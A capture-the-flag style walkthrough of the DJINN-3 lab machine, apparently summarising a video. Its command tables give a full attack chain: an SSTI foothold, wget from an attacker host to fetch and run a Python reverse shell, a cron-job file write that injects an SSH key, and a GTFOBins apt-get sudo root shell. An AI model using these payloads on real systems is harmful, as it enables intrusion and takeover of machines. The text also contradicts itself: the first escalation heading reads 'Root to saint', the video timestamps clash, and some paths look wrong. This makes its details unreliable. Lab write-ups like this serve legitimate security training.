This walkthrough for the **DJINN-3** machine (PG-Play) focuses on key phases of an OSCP-style engagement: initial enumeration, gaining a low-privilege shell via Server-Side Template Injection (SSTI), and two stages of privilege escalation to ultimately achieve root access.

## 🎯 Comprehensive Notes & Commands for OSCP

The target machine is running **Ubuntu** and exposes several network services, leading to a multi-stage exploit chain.

***

### 1. Initial Foothold: SSTI RCE

The initial foothold was achieved by exploiting a hardcoded credential followed by a Server-Side Template Injection (SSTI) vulnerability in a custom application.

#### 📝 Key Findings

| Phase | Finding | Description |
| :--- | :--- | :--- |
| **Ports** | `22`, `80`, `5000`, `31337` | **Port 31337** was the most critical for initial access, presenting a unique login prompt. [[03:38](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=218)] |
| **Login** | **`guest:guest`** | Default credentials bypass the login prompt on port `31337`, granting access to a custom ticketing system CLI. [[02:41:00](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=9660)] |
| **Vulnerability** | **Jinja2 SSTI** | The ticketing system's ticket creation fields were vulnerable to Server-Side Template Injection, confirmed by testing `7*7` which reflected `49`. [[03:33:33](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=12813)] |
| **Exploitation** | **Two-Stage RCE** | The SSTI was used to execute OS commands, leading to a reverse shell. |

#### 💻 Key Commands

| Stage | Command | Purpose |
| :--- | :--- | :--- |
| **Enumeration** | `nmap -sV -sC -p- <TARGET_IP>` | Comprehensive scan of all 65535 ports with service version detection (`-sV`) and default scripts (`-sC`). [[01:05](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=65)] |
| **Initial Access** | `nc -nv <TARGET_IP> 31337` | Connect to the login prompt. Credentials: **`guest`** / **`guest`**. [[02:09:40](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=7780)] |
| **SSTI Confirmation** | `open` (in the ticket system) **Title: `{{7*7}}`** | Confirms SSTI by reflecting the mathematical result. [[03:28:40](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=12520)] |
| **Reverse Shell (Stage 1 - Delivery)** | `wget http://<ATTACKER_IP>:8000/owned.pi -O /var/temp/owned.pi` | Used in an RCE payload to download the Python reverse shell script (`owned.pi`) to a world-writable directory. [[04:09:50](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=14990)] |
| **Reverse Shell (Stage 2 - Execution)** | `python /var/temp/owned.pi` | Used in an RCE payload to execute the downloaded script, triggering the reverse shell connection. [[04:24:22](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=15862)] |
| **Shell Upgrade** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade the initial low-privilege Netcat shell to a stable TTY shell. [[04:40:50](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=16850)] |

***

### 2. Privilege Escalation 1: Root to `saint`

The first escalation stage exploited a scheduled cron job misconfiguration that allowed **arbitrary file writing** as the root user.

#### 📝 Key Findings

| Phase | Finding | Description |
| :--- | :--- | :--- |
| **Process Monitoring** | **Cron Job Execution** | Using `pspy64`, a scheduled job was found running a Python script: `/usr/bin/python3 /opt/sinker.py`. This script runs as **root**. [[01:01:10](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=3670)] |
| **File Misconfig** | **Python Decompilation** | Decompiling the Python bytecode (`.pyc` files) revealed that `sinker.py` checks for specific JSON files in the world-writable `/var/temp` directory (e.g., `MM-DD-YYYY.config.json`). [[01:02:00](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=3720)] |
| **Vulnerability** | **Arbitrary File Write** | The decompiled script showed it would accept a `url` parameter (to fetch data) and an **`output`** parameter (to specify a destination path), allowing an attacker to write any data to any file as **root**. [[01:04:07](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=3847)] |
| **Exploitation** | **SSH Key Injection** | The vulnerability was used to inject the attacker's public SSH key into the `authorized_keys` file of the user **`saint`**, gaining immediate SSH access to a higher-privilege user. |

#### 💻 Key Commands

| Stage | Command | Purpose |
| :--- | :--- | :--- |
| **Discovery** | `wget http://<ATTACKER_IP>:8000/pspy64 /tmp/pspy64` `chmod +x /tmp/pspy64` `./pspy64` | Download and run the process monitor to find hidden cron jobs and processes. [[05:01:00](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=18060)] |
| **Payload Creation** | `ssh-keygen` `cp ~/.ssh/id_rsa.pub .` | Generate an SSH key pair (if none exists) and copy the public key to the current directory for transfer. [[01:04:45](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=3885)] |
| **Malicious JSON** | (Attacker's machine) `nano 08-04-2023.config.json` | Create the JSON file payload (The date must match the current date on the target machine). |
| | **File Contents:** `{"url": "http://<ATTACKER_IP>:8000/id_rsa.pub", "output": "/home/saint/.ssh/authorized_keys"}` | Instructs the cron job to download the public key and write it to the `saint` user's SSH keys file. [[01:06:52](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4012)] |
| **Payload Transfer** | `wget http://<ATTACKER_IP>:8000/08-04-2023.config.json -O /var/temp/08-04-2023.config.json` | Transfer the malicious JSON file into the `/var/temp` directory for the cron job to execute. [[01:08:17](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4097)] |
| **Access** | `ssh saint@<TARGET_IP>` | Log in as the user `saint` using the newly injected SSH key. [[01:11:00](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4260)] |

***

### 3. Privilege Escalation 2: `saint` to `root`

The final stage of privilege escalation used a critical misconfiguration in the `sudoers` file.

#### 📝 Key Findings

| Phase | Finding | Description |
| :--- | :--- | :--- |
| **Sudoers Misconfig** | **Hidden User** | As `saint`, the attacker could read `/etc/sudoers` (`cat /etc/sudoers`). An entry was found granting **NOPASSWD** privileges on `/usr/bin/apt-get` to a user named **`Jason`**, despite the user not existing on the system. [[01:19:30](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4770)] |
| **Vulnerability** | **Sudo NOPASSWD** | The ability to execute a binary as root without a password can be exploited to gain a root shell, a method well-documented on GTFOBins. |
| **Exploitation** | **User Creation & Exploit** | Create the user **`Jason`**, then use the `apt-get` binary to execute a shell as root. |

#### 💻 Key Commands

| Stage | Command | Purpose |
| :--- | :--- | :--- |
| **Discovery** | `sudo -l` or `cat /etc/sudoers` | Check `saint`'s sudo permissions and read the configuration file. [[01:18:25](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4705)] |
| **User Creation** | `sudo /usr/sbin/adduser jason` `sudo /usr/sbin/adduser jason sudo` | Use `saint`'s sudo privileges to create the user **`jason`** and add them to the sudo group (the latter is not strictly necessary but done in the video). [[01:21:05](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4865)] |
| **Access** | `su jason` | Switch to the newly created user **`jason`**. [[01:21:30](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4890)] |
| **Root Shell** | `sudo apt-get update -o APT::Update::Pre-Invoke::='sh -c "/bin/bash -i <&4 >&4 2>&4"'` | The specific `apt-get` exploit (from GTFOBins) to execute an interactive root shell. *The video's final execution is a variation of this technique.* [[01:22:20](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=4940)] |
| **Final Proof** | `cat /root/proof.txt` | Read the final flag file. [[01:23:47](http://www.youtube.com/watch?v=O_vzvl8ueDs&t=5027)] |

The walkthrough video is available here: [DJINN-3 (PG-Play) - Walkthrough with S1REN !](http://www.youtube.com/watch?v=O_vzvl8ueDs)
http://googleusercontent.com/youtube_content/0